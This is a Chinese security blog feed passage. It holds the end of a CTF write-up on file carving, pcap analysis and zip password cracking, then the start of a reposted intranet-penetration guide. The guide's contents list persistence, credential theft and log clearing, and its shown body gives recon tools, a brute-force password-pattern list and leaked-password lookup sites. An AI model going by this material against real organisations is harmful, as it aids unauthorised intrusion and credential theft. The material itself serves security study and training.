<p>使用<code>binwalk -e 文件名</code>，发现这并不是我们要的文件，这时候就想到了，可能不能使用binwalk进行分离，试试foremost</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103024275.png" alt="image-20200625103024275"></p>
<p>命令：<code>foremost 文件名 -o 自己设置文件名</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103154968.png" alt="image-20200625103154968"></p>
<p>我们设置的输出文件名是123.这时候桌面就多出了123文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103231143.png" alt="image-20200625103231143"></p>
<p>打开看看有没有我们需要的，分离出一个二维码，直接扫一下就行了，就返回flag了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103247827.png" alt="image-20200625103247827"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103352901.png" alt="image-20200625103352901"></p>
<h3 id="Backdoor"><a href="#Backdoor" class="headerlink" title="Backdoor"></a>Backdoor</h3><p>可以看到提示是用wireshark来分析</p>
<p>下载文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103508433.png" alt="image-20200625103508433"></p>
<p>下载完之后使用wireshark打开文件</p>
<p>随便点击一个协议，进行追踪流</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103817559.png" alt="image-20200625103817559"></p>
<p>右键，追踪流，右键什么协议就追踪什么流，</p>
<p>我们右键的是TCP所以追踪TCP流</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103927816.png" alt="image-20200625103927816"></p>
<p>发现里面有很多编码，其实都经过尝试了，都是没用的，往下划，看看有没有有用的信息</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625104045743.png" alt="image-20200625104045743"></p>
<p>可以看到这一大串中在z1后是16进制，文件头是ZIP的，所以我们复制z1后的16进制</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625104151978.png" alt="image-20200625104151978"></p>
<p>复制完之后在010Editor中粘贴</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625104401280.png" alt="image-20200625104401280"></p>
<p>另存为ZIP文件，然后进行解压，成功返回了二维码，扫描一下即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625104454771.png" alt="image-20200625104454771"></p>
<h3 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h3><p>下载文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625191412085.png" alt="image-20200625191412085"></p>
<p>打开发现是个游戏，要坚持60s不死，就会返回flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625191451270.png" alt="image-20200625191451270"></p>
<p>当我们放大这个游戏的时候，发现旁边是空白的，然后我们可以移动到空白的地方。这是树叶方块碰不到，然后等60s在出来死掉就出现flag了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625191652380.png" alt="image-20200625191652380"></p>
<p>这样就出现flag了，这是一种方法。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625191712691.png" alt="image-20200625191712691"></p>
<p>还有一种方法</p>
<p>使用binwalk查看隐藏内容，发现有很多</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625191937299.png" alt="image-20200625191937299"></p>
<p>然后将其分离出来，我们这里使用的是foremost</p>
<p>分离出两个文件，一个是GIF里面全是图片没有什么值得关注的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192011347.png" alt="image-20200625192011347"></p>
<p>但是在zip文件中有一个压缩包，进行解压，然后进去得到三个文件夹</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192107665.png" alt="image-20200625192107665"></p>
<p>image文件夹，也是图片没有用，这样就剩下两个文件夹了，经过测试我们发现flag在cn\bjsxt\plane下的PlaneGameFrame.class里面</p>
<p>打开该文本，搜索flag，就找到了，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192359239.png" alt="image-20200625192359239"></p>
<h3 id="fuck-4"><a href="#fuck-4" class="headerlink" title="fuck_4"></a>fuck_4</h3><p>打开网页需要下载一个zip的文件，下载下来</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192449724.png" alt="image-20200625192449724"></p>
<p>下载完成后打开，发现有一个flag文本，打开看看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192530397.png" alt="image-20200625192530397"></p>
<p>打开后发现需要输入文件密码，我们不知道密码，然后使用ARCHPR进行爆破一下，这样成功得到密码。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192702483.png" alt="image-20200625192702483"></p>
<p>将密码输入，打开文件，这样就成功得到了密码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192824329.png" alt="image-20200625192824329"></p>
]]></content>
  </entry>
  <entry>
    <title>内网渗透思路</title>
    <url>/2020/07/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<p> Author: <a href="https://twitter.com/Evi1cg" target="_blank" rel="noopener">Evi1cg</a><br> Blog: <a href="https://evi1cg.github.io" target="_blank" rel="noopener">https://evi1cg.github.io</a></p>
<h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ul>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86">信息搜集</a><ul>
<li><a href="#%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86osint">开源情报信息收集（OSINT）</a><ul>
<li><a href="#github">github</a></li>
<li><a href="#whois%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E4%BA%BA%E5%8F%8D%E6%9F%A5%E9%82%AE%E7%AE%B1%E5%8F%8D%E6%9F%A5%E7%9B%B8%E5%85%B3%E8%B5%84%E4%BA%A7">whois查询/注册人反查/邮箱反查/相关资产</a></li>
<li><a href="#google-hacking">google hacking</a></li>
</ul>
</li>
<li><a href="#%E5%88%9B%E5%BB%BA%E4%BC%81%E4%B8%9A%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8">创建企业密码字典</a><ul>
<li><a href="#%E5%AD%97%E5%85%B8%E5%88%97%E8%A1%A8">字典列表</a></li>
<li><a href="#%E9%82%AE%E7%AE%B1%E5%88%97%E8%A1%A8%E8%8E%B7%E5%8F%96">邮箱列表获取</a></li>
<li><a href="#%E6%B3%84%E9%9C%B2%E5%AF%86%E7%A0%81%E6%9F%A5%E8%AF%A2">泄露密码查询</a></li>
<li><a href="#%E5%AF%B9%E4%BC%81%E4%B8%9A%E5%A4%96%E9%83%A8%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E8%BF%9B%E8%A1%8C%E6%90%9C%E9%9B%86">对企业外部相关信息进行搜集</a><ul>
<li><a href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E8%8E%B7%E5%8F%96">子域名获取</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91">进入内网</a><ul>
<li><a href="#%E5%9F%BA%E4%BA%8E%E4%BC%81%E4%B8%9A%E5%BC%B1%E8%B4%A6%E5%8F%B7%E6%BC%8F%E6%B4%9E">基于企业弱账号漏洞</a></li>
<li><a href="#%E5%9F%BA%E4%BA%8E%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E8%BF%9B%E5%85%A5">基于系统漏洞进入</a></li>
<li><a href="#%E7%BD%91%E7%AB%99%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F">网站应用程序渗透</a></li>
<li><a href="#%E6%97%A0%E7%BA%BFwi-fi%E6%8E%A5%E5%85%A5">无线Wi-Fi接入</a></li>
</ul>
</li>
<li><a href="#%E9%9A%90%E5%8C%BF%E6%94%BB%E5%87%BB">隐匿攻击</a><ul>
<li><a href="#command-and-control">Command and Control</a></li>
<li><a href="#fronting">Fronting</a></li>
<li><a href="#%E4%BB%A3%E7%90%86">代理</a></li>
</ul>
</li>
<li><a href="#%E5%86%85%E7%BD%91%E8%B7%A8%E8%BE%B9%E7%95%8C%E5%BA%94%E7%94%A8">内网跨边界应用</a><ul>
<li><a href="#%E5%86%85%E7%BD%91%E8%B7%A8%E8%BE%B9%E7%95%8C%E8%BD%AC%E5%8F%91">内网跨边界转发</a></li>
<li><a href="#%E5%86%85%E7%BD%91%E8%B7%A8%E8%BE%B9%E7%95%8C%E4%BB%A3%E7%90%86%E7%A9%BF%E9%80%8F">内网跨边界代理穿透</a><ul>
<li><a href="#ew">EW</a></li>
<li><a href="#termite">Termite</a></li>
<li><a href="#%E4%BB%A3%E7%90%86%E8%84%9A%E6%9C%AC">代理脚本</a></li>
</ul>
</li>
<li><a href="#shell%E5%8F%8D%E5%BC%B9">shell反弹</a></li>
<li><a href="#%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E7%9A%84%E4%BC%A0%E8%BE%93%E5%92%8C%E4%B8%8B%E8%BD%BD">内网文件的传输和下载</a></li>
<li><a href="#%E6%90%AD%E5%BB%BA%20HTTP%20server">搭建 HTTP server</a></li>
</ul>
</li>
<li><a href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86">内网信息搜集</a><ul>
<li><a href="#%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86">本机信息搜集</a><ul>
<li><a href="#1%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8">1、用户列表</a></li>
<li><a href="#2%E8%BF%9B%E7%A8%8B%E5%88%97%E8%A1%A8">2、进程列表</a></li>
<li><a href="#3%E6%9C%8D%E5%8A%A1%E5%88%97%E8%A1%A8">3、服务列表</a></li>
<li><a href="#4%E7%AB%AF%E5%8F%A3%E5%88%97%E8%A1%A8">4、端口列表</a></li>
<li><a href="#5%E8%A1%A5%E4%B8%81%E5%88%97%E8%A1%A8">5、补丁列表</a></li>
<li><a href="#6%E6%9C%AC%E6%9C%BA%E5%85%B1%E4%BA%AB">6、本机共享</a></li>
<li><a href="#7%E6%9C%AC%E7%94%A8%E6%88%B7%E4%B9%A0%E6%83%AF%E5%88%86%E6%9E%90">7、本用户习惯分析</a></li>
<li><a href="#8%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E5%B7%A5%E5%85%B7">8、获取当前用户密码工具</a><ul>
<li><a href="#windows">Windows</a></li>
<li><a href="#linux">Linux</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%89%A9%E6%95%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">扩散信息收集</a><ul>
<li><a href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">端口扫描</a><ul>
<li><a href="#%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7">常用端口扫描工具</a></li>
</ul>
</li>
<li><a href="#%E5%86%85%E7%BD%91%E6%8B%93%E6%89%91%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90">内网拓扑架构分析</a></li>
<li><a href="#%E5%B8%B8%E8%A7%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4">常见信息收集命令</a></li>
</ul>
</li>
<li><a href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">第三方信息收集</a></li>
</ul>
</li>
<li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a><ul>
<li><a href="#windows-1">Windows</a><ul>
<li><a href="#bypassuac">BypassUAC</a><ul>
<li><a href="#%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95">常用方法</a></li>
<li><a href="#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7">常用工具</a></li>
</ul>
</li>
<li><a href="#%E6%8F%90%E6%9D%83">提权</a></li>
</ul>
</li>
<li><a href="#linux-1">Linux</a><ul>
<li><a href="#%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83">内核溢出提权</a></li>
<li><a href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">计划任务</a></li>
<li><a href="#suid">SUID</a></li>
<li><a href="#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E7%9A%84%E9%94%99%E8%AF%AF%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E">系统服务的错误权限配置漏洞</a></li>
<li><a href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E6%96%87%E4%BB%B6%E5%A4%B9%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE">不安全的文件/文件夹权限配置</a></li>
<li><a href="#%E6%89%BE%E5%AD%98%E5%82%A8%E7%9A%84%E6%98%8E%E6%96%87%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81">找存储的明文用户名，密码</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81">权限维持</a><ul>
<li><a href="#%E7%B3%BB%E7%BB%9F%E5%90%8E%E9%97%A8">系统后门</a><ul>
<li><a href="#windows-2">Windows</a><ul>
<li><a href="#1%E5%AF%86%E7%A0%81%E8%AE%B0%E5%BD%95%E5%B7%A5%E5%85%B7">1、密码记录工具</a></li>
<li><a href="#2%E5%B8%B8%E7%94%A8%E7%9A%84%E5%AD%98%E5%82%A8payload%E4%BD%8D%E7%BD%AE">2、常用的存储Payload位置</a></li>
<li><a href="#3runrunonce-keys">3、Run/RunOnce Keys</a></li>
<li><a href="#4bootexecute-key">4、BootExecute Key</a></li>
<li><a href="#5userinit-key">5、Userinit Key</a></li>
<li><a href="#6startup-keys">6、Startup Keys</a></li>
<li><a href="#7services">7、Services</a></li>
<li><a href="#8browser-helper-objects">8、Browser Helper Objects</a></li>
<li><a href="#9appinit_dlls">9、AppInit_DLLs</a></li>
<li><a href="#10%E6%96%87%E4%BB%B6%E5%85%B3%E8%81%94">10、文件关联</a></li>
<li><a href="#11bitsadmin">11、bitsadmin</a></li>
<li><a href="#12mof-">12、mof </a></li>
<li><a href="#13wmi">13、wmi</a></li>
<li><a href="#14userland-persistence-with-scheduled-tasks">14、Userland Persistence With Scheduled Tasks</a></li>
<li><a href="#15netsh">15、Netsh</a></li>
<li><a href="#16shim">16、Shim</a></li>
<li><a href="#17dll%E5%8A%AB%E6%8C%81">17、DLL劫持</a></li>
<li><a href="#18doubleagent-">18、DoubleAgent </a></li>
<li><a href="#19waitforexe-">19、waitfor.exe </a></li>
<li><a href="#20appdomainmanager">20、AppDomainManager</a></li>
<li><a href="#21office">21、Office</a></li>
<li><a href="#22clr">22、CLR</a></li>
<li><a href="#23msdtc">23、msdtc</a></li>
<li><a href="#24hijack-caccpropservicesclass-and-mmdeviceenumerato">24、Hijack CAccPropServicesClass and MMDeviceEnumerato</a></li>
<li><a href="#25hijack-explorerexe">25、Hijack explorer.exe</a></li>
<li><a href="#26windows-fax-dll-injection">26、Windows FAX DLL Injection</a></li>
<li><a href="#27%E7%89%B9%E6%AE%8A%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%94%AE%E5%80%BC">27、特殊注册表键值</a></li>
<li><a href="#28%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E5%90%8E%E9%97%A8">28、快捷方式后门</a></li>
<li><a href="#29logon-scripts">29、Logon Scripts</a></li>
<li><a href="#30password-filter-dll">30、Password Filter DLL</a></li>
<li><a href="#31%E5%88%A9%E7%94%A8bho%E5%AE%9E%E7%8E%B0ie%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81">31、利用BHO实现IE浏览器劫持</a></li>
</ul>
</li>
<li><a href="#linux-2">Linux</a><ul>
<li><a href="#crontab">crontab</a></li>
<li><a href="#%E7%A1%AC%E9%93%BE%E6%8E%A5sshd">硬链接sshd</a></li>
<li><a href="#ssh-server-wrapper">SSH Server wrapper</a></li>
<li><a href="#ssh-keylogger">SSH keylogger</a></li>
<li><a href="#cymothoa_%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5backdoor">Cymothoa_进程注入backdoor</a></li>
<li><a href="#rootkit">rootkit</a></li>
<li><a href="#tools">Tools</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#web%E5%90%8E%E9%97%A8">WEB后门</a></li>
</ul>
</li>
<li><a href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F">横向渗透</a><ul>
<li><a href="#%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F">端口渗透</a><ul>
<li><a href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-1">端口扫描</a></li>
<li><a href="#%E7%AB%AF%E5%8F%A3%E7%88%86%E7%A0%B4">端口爆破</a></li>
<li><a href="#%E7%AB%AF%E5%8F%A3%E5%BC%B1%E5%8F%A3%E4%BB%A4">端口弱口令</a></li>
<li><a href="#%E7%AB%AF%E5%8F%A3%E6%BA%A2%E5%87%BA">端口溢出</a></li>
<li><a href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3">常见的默认端口</a><ul>
<li><a href="#1web%E7%B1%BBweb%E6%BC%8F%E6%B4%9E%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95">1、web类(web漏洞/敏感目录)</a></li>
<li><a href="#2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E6%89%AB%E6%8F%8F%E5%BC%B1%E5%8F%A3%E4%BB%A4">2、数据库类(扫描弱口令)</a></li>
<li><a href="#3%E7%89%B9%E6%AE%8A%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%B1%BB%E6%BC%8F%E6%B4%9E">3、特殊服务类(未授权/命令执行类/漏洞)</a></li>
<li><a href="#4%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E7%B1%BB%E6%89%AB%E6%8F%8F%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%AB%AF%E5%8F%A3%E7%88%86%E7%A0%B4">4、常用端口类(扫描弱口令/端口爆破)</a></li>
<li><a href="#5%E7%AB%AF%E5%8F%A3%E5%90%88%E8%AE%A1%E6%89%80%E5%AF%B9%E5%BA%94%E7%9A%84%E6%9C%8D%E5%8A%A1">5、端口合计所对应的服务</a></li>
</ul>
</li>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1">信息搜集</a></li>
<li><a href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95">获取域控的方法</a><ul>
<li><a href="#sysvol">SYSVOL</a></li>
<li><a href="#ms14-068-kerberos">MS14-068 Kerberos</a></li>
<li><a href="#spn%E6%89%AB%E6%8F%8F">SPN扫描</a></li>
<li><a href="#kerberos%E7%9A%84%E9%BB%84%E9%87%91%E9%97%A8%E7%A5%A8">Kerberos的黄金门票</a></li>
<li><a href="#kerberos%E7%9A%84%E9%93%B6%E7%A5%A8%E5%8A%A1">Kerberos的银票务</a></li>
<li><a href="#%E5%9F%9F%E6%9C%8D%E5%8A%A1%E8%B4%A6%E5%8F%B7%E7%A0%B4%E8%A7%A3">域服务账号破解</a></li>
<li><a href="#%E5%87%AD%E8%AF%81%E7%9B%97%E7%AA%83">凭证盗窃</a></li>
<li><a href="#%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AE">地址解析协议</a></li>
</ul>
</li>
<li><a href="#%E8%8E%B7%E5%8F%96ad%E5%93%88%E5%B8%8C">获取AD哈希</a></li>
<li><a href="#ad%E6%8C%81%E4%B9%85%E5%8C%96">AD持久化</a><ul>
<li><a href="#%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E6%8C%81%E4%B9%85%E6%80%A7%E6%8A%80%E5%B7%A7">活动目录持久性技巧</a></li>
<li><a href="#security-support-provider">Security Support Provider</a></li>
<li><a href="#sid-history">SID History</a></li>
<li><a href="#adminsdholdersdprop-">AdminSDHolder＆SDProp</a></li>
<li><a href="#%E7%BB%84%E7%AD%96%E7%95%A5">组策略</a></li>
<li><a href="#hook-passwordchangenotify">Hook PasswordChangeNotify</a></li>
</ul>
</li>
<li><a href="#tips">TIPS</a></li>
<li><a href="#%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7">相关工具</a></li>
</ul>
</li>
<li><a href="#%E5%9C%A8%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E4%B8%8A%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F">在远程系统上执行程序</a></li>
<li><a href="#iot%E7%9B%B8%E5%85%B3">IOT相关</a></li>
<li><a href="#%E4%B8%AD%E9%97%B4%E4%BA%BA">中间人</a></li>
<li><a href="#%E8%A7%84%E9%81%BF%E6%9D%80%E8%BD%AF%E5%8F%8A%E6%A3%80%E6%B5%8B">规避杀软及检测</a><ul>
<li><a href="#bypass-applocker">Bypass Applocker</a></li>
<li><a href="#bypassav">bypassAV</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86">痕迹清理</a><ul>
<li><a href="#windows%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4">Windows日志清除</a></li>
<li><a href="#%E7%A0%B4%E5%9D%8Fwindows%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E5%8A%9F%E8%83%BD">破坏Windows日志记录功能</a></li>
<li><a href="#msf">msf</a></li>
<li><a href="#3389%E7%99%BB%E9%99%86%E8%AE%B0%E5%BD%95%E6%B8%85%E9%99%A4">3389登陆记录清除</a></li>
</ul>
</li>
</ul>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="开源情报信息收集（OSINT）"><a href="#开源情报信息收集（OSINT）" class="headerlink" title="开源情报信息收集（OSINT）"></a>开源情报信息收集（OSINT）</h3><h4 id="github"><a href="#github" class="headerlink" title="github"></a>github</h4><ul>
<li>Github_Nuggests（自动爬取Github上文件敏感信息泄露） :<a href="https://github.com/az0ne/Github_Nuggests" target="_blank" rel="noopener">https://github.com/az0ne/Github_Nuggests</a></li>
<li>GSIL（能够实现近实时（15分钟内）的发现Github上泄露的信息） :<a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">https://github.com/FeeiCN/GSIL</a></li>
<li>x-patrol(小米团队的):<a href="https://github.com/MiSecurity/x-patrol" target="_blank" rel="noopener">https://github.com/MiSecurity/x-patrol</a></li>
</ul>
<h4 id="whois查询-注册人反查-邮箱反查-相关资产"><a href="#whois查询-注册人反查-邮箱反查-相关资产" class="headerlink" title="whois查询/注册人反查/邮箱反查/相关资产"></a>whois查询/注册人反查/邮箱反查/相关资产</h4><ul>
<li>站长之家:<a href="http://whois.chinaz.com/?DomainName=target.com&amp;ws=" target="_blank" rel="noopener">http://whois.chinaz.com/?DomainName=target.com&amp;ws=</a></li>
<li>爱站:<a href="https://whois.aizhan.com/target.com/" target="_blank" rel="noopener">https://whois.aizhan.com/target.com/</a></li>
<li>微步在线:<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a></li>
<li>IP反查:<a href="https://dns.aizhan.com/" target="_blank" rel="noopener">https://dns.aizhan.com/</a></li>
<li>天眼查:<a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a></li>
<li>虎妈查:<a href="http://www.whomx.com/" target="_blank" rel="noopener">http://www.whomx.com/</a></li>
<li>历史漏洞查询 :<ul>
<li>在线查询:<a href="http://wy.zone.ci/" target="_blank" rel="noopener">http://wy.zone.ci/</a></li>
<li>自搭建:<a href="https://github.com/hanc00l/wooyun_publi/" target="_blank" rel="noopener">https://github.com/hanc00l/wooyun_publi/</a></li>
</ul>
</li>
</ul>
<h4 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h4><h3 id="创建企业密码字典"><a href="#创建企业密码字典" class="headerlink" title="创建企业密码字典"></a>创建企业密码字典</h3><h4 id="字典列表"><a href="#字典列表" class="headerlink" title="字典列表"></a>字典列表</h4><ul>
<li>passwordlist:<a href="https://github.com/lavalamp-/password-lists" target="_blank" rel="noopener">https://github.com/lavalamp-/password-lists</a></li>
<li>猪猪侠字典:<a href="https://pan.baidu.com/s/1dFJyedz" target="_blank" rel="noopener">https://pan.baidu.com/s/1dFJyedz</a><br><a href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener">Blasting_dictionary</a>（分享和收集各种字典，包括弱口令，常用密码，目录爆破。数据库爆破，编辑器爆破，后台爆破等） </li>
<li>针对特定的厂商，重点构造厂商相关域名的字典<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;%pwd%123&#39;,&#39;%user%123&#39;,&#39;%user%521&#39;,&#39;%user%2017&#39;,&#39;%pwd%321&#39;,&#39;%pwd%521&#39;,&#39;%user%321&#39;,&#39;%pwd%123!&#39;,&#39;%pwd%123!@#&#39;,&#39;%pwd%1234&#39;,&#39;%user%2016&#39;,&#39;%user%123$%^&#39;,&#39;%user%123!@#&#39;,&#39;%pwd%2016&#39;,&#39;%pwd%2017&#39;,&#39;%pwd%1!&#39;,&#39;%pwd%2@&#39;,&#39;%pwd%3#&#39;,&#39;%pwd%123#@!&#39;,&#39;%pwd%12345&#39;,&#39;%pwd%123$%^&#39;,&#39;%pwd%!@#456&#39;,&#39;%pwd%123qwe&#39;,&#39;%pwd%qwe123&#39;,&#39;%pwd%qwe&#39;,&#39;%pwd%123456&#39;,&#39;%user%123#@!&#39;,&#39;%user%!@#456&#39;,&#39;%user%1234&#39;,&#39;%user%12345&#39;,&#39;%user%123456&#39;,&#39;%user%123!&#39;]</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="密码生成"><a href="#密码生成" class="headerlink" title="密码生成"></a>密码生成</h4><ul>
<li>GenpAss（中国特色的弱口令生成器: <a href="https://github.com/RicterZ/genpAss/" target="_blank" rel="noopener">https://github.com/RicterZ/genpAss/</a></li>
<li>passmaker（可以自定义规则的密码字典生成器） ：<a href="https://github.com/bit4woo/passmaker" target="_blank" rel="noopener">https://github.com/bit4woo/passmaker</a></li>
<li>pydictor（强大的密码生成器） ：<a href="https://github.com/LandGrey/pydictor" target="_blank" rel="noopener">https://github.com/LandGrey/pydictor</a></li>
</ul>
<h4 id="邮箱列表获取"><a href="#邮箱列表获取" class="headerlink" title="邮箱列表获取"></a>邮箱列表获取</h4><ul>
<li>theHarvester ：<a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">https://github.com/laramies/theHarvester</a></li>
<li>获取一个邮箱以后导出通讯录 </li>
<li>LinkedInt :<a href="https://github.com/mdsecactivebreach/LinkedInt" target="_blank" rel="noopener">https://github.com/mdsecactivebreach/LinkedInt</a></li>
<li>Mailget：<a href="https://github.com/Ridter/Mailget" target="_blank" rel="noopener">https://github.com/Ridter/Mailget</a></li>
</ul>
<h4 id="泄露密码查询"><a href="#泄露密码查询" class="headerlink" title="泄露密码查询"></a>泄露密码查询</h4><ul>
<li>ghostproject: <a href="https://ghostproject.fr/" target="_blank" rel="noopener">https://ghostproject.fr/</a></li>
<li>pwndb: <a href="https://pwndb2am4tzkvold.onion.to/" target="_blank" rel="noopener">https://pwndb2am4tzkvold.onion.to/</a></li>
</ul>
<h4 id="对企业外部相关信息进行搜集"><a href="#对企业外部相关信息进行搜集" class="headerlink" title="对企业外部相关信息进行搜集"></a>对企业外部相关信息进行搜集</h4><h5 id="子域名获取"><a href="#子域名获取" class="headerlink" title="子域名获取"></a>子域名获取</h5><ul>
<li>Layer子域名挖掘机4.2纪念版 </li>
<li>subDomainsBrute ：<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></li>
<li>wydomain ：<a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">https://github.com/ring04h/wydomain</a></li>
<li>Sublist3r ：<a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a></li>
<li>site:target.com:<a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a></li>
<li>Github代码仓库 </li>
<li>抓包分析请求返回值(跳转/文件上传/app/api接口等) </li>
<li>站长帮手links等在线查询网站 </li>
<li>域传送漏洞 </li>
</ul>
<p>Linux</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig @ns.example.com example&#x3D;.com AXFR</span><br></pre></td></tr></table></figure>
<p>Windows</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nslookup -type&#x3D;ns xxx.yyy.cn #查询解析某域名的DNS服务器</span><br><span class="line">nslookup #进入nslookup交互模式</span><br><span class="line">server dns.domian.com #指定dns服务器</span><br><span class="line">ls xxx.yyy.cn #列出域信息</span><br></pre></td></tr></table></figure>

<ul>
